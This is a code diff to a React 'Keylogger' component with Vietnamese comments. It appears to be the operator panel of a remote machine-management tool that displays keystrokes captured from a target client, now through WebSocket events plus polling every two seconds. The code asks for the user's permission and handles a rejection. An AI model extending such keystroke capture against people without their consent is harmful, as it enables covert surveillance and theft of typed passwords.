@@ -1,19 +1,50 @@
 // frontend/src/components/modules/Keylogger.jsx
-import React, { useState, useEffect } from 'react';
+import React, { useState, useEffect, useCallback } from 'react';
 
 const Keylogger = ({ machineId, sendCommand, lastMessage }) => {
     const [isLogging, setIsLogging] = useState(false);
     const [logs, setLogs] = useState('');
     const [status, setStatus] = useState('');
 
-    // Lắng nghe sự kiện bàn phím thời gian thực từ WebSocket
+    // Helper: nối entries array thành chuỗi hiển thị
+    const appendEntries = useCallback((entries) => {
+        if (!entries || entries.length === 0) return;
+        const text = entries.map(e => e.key).join('');
+        setLogs(prev => prev + text);
+    }, []);
+
+    // Lắng nghe keylogger.data event (push từ Client)
     useEffect(() => {
-        if (isLogging && lastMessage && lastMessage.type === 'keylogger.event') {
-            if (lastMessage.payload?.key) {
-                setLogs(prev => prev + lastMessage.payload.key);
-            }
+        if (isLogging && lastMessage && lastMessage.type === 'keylogger.data') {
+            appendEntries(lastMessage.payload?.entries);
         }
-    }, [lastMessage, isLogging]);
+    }, [lastMessage, isLogging, appendEntries]);
+
+    // Polling: fallback cho keylogger.data mỗi 2 giây
+    useEffect(() => {
+        if (!isLogging) return;
+
+        const poll = async () => {
+            try {
+                const res = await sendCommand('keylogger.data', machineId);
+                if (!res.success) return;
+                // Format entries array (theo docs)
+                if (res.data?.entries) {
+                    appendEntries(res.data.entries);
+                // fallback: format logs string (cũ)
+                } else if (res.data?.logs) {
+                    setLogs(prev => prev + res.data.logs);
+                }
+            } catch (err) {
+                console.error('Poll keylogger.data error:', err);
+            }
+        };
+
+        poll();
+        const interval = setInterval(poll, 2000);
+
+        return () => clearInterval(interval);
+    }, [isLogging, machineId, sendCommand, appendEntries]);
 
     const startLogging = async () => {
         setStatus('Đang xin phép người dùng để bật ghi phím...');
@@ -22,6 +53,8 @@ const Keylogger = ({ machineId, sendCommand, lastMessage }) => {
             if (res.success) {
                 setIsLogging(true);
                 setStatus('🟢 Đang ghi phím thời gian thực');
+            } else if (res.error) {
+                setStatus(`❌ ${res.error}`);
             }
         } catch (err) {
             if (err.code === 'USER_REJECTED') {
